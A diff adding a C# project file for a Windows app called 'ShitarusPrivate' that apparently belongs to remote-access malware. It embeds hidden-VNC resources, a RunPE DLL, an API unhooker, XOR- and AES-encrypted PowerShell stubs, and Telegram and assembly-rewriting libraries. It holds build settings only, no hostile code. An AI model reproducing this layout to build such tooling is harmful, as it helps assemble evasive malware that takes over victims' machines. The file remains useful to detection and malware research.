@@ -1,0 +1,93 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>ShitarusPrivate</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net472</TargetFramework>
+    <Prefer32Bit>True</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>11.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <RootNamespace>ShitarusPrivate</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|AnyCPU'">
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|AnyCPU'">
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Compile Remove="HVNC.Resources.Stub.cs" />
+    <Compile Remove="HVNC\Resources\Stub.cs" />
+    <None Remove="HVNC.Resources.XORStub.ps1" />
+    <None Remove="HVNC.Resources.AESStub.ps1" />
+    <None Remove="HVNC.Resources.runpe.dll" />
+    <None Remove="HVNC.Resources.apiunhooker.dll" />
+    <None Remove="HVNC\Properties\Resources.resources" />
+    <None Remove="HVNC\Resources\AESStub.ps1" />
+    <None Remove="HVNC\Resources\apiunhooker.dll" />
+    <None Remove="HVNC\Resources\runpe.dll" />
+    <None Remove="HVNC\Resources\XORStub.ps1" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="HVNC\Properties\Resources.resources" />
+    <EmbeddedResource Include="HVNC\Resources\AESStub.ps1" />
+    <EmbeddedResource Include="HVNC\Resources\apiunhooker.dll" />
+    <EmbeddedResource Include="HVNC\Resources\runpe.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="HVNC\Resources\Stub.cs" />
+    <EmbeddedResource Include="HVNC\Resources\XORStub.ps1" />
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="System.Runtime.CompilerServices.Unsafe" Version="6.0.0" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="Telegram.Bot">
+      <HintPath>..\Telegram.Bot.dll</HintPath>
+    </Reference>
+    <Reference Include="NDesk.Options">
+      <HintPath>..\NDesk.Options.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="GMap.NET.WindowsForms">
+      <HintPath>..\GMap.NET.WindowsForms.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="dnlib">
+      <HintPath>..\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Management" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Net.Http">
+      <HintPath>..\System.Net.Http.dll</HintPath>
+    </Reference>
+    <Reference Include="OpenMcdf">
+      <HintPath>..\OpenMcdf.dll</HintPath>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="IconExtractor">
+      <HintPath>..\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil">
+      <HintPath>..\Mono.Cecil.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.Core">
+      <HintPath>..\GMap.NET.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="PeNet">
+      <HintPath>..\PeNet.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
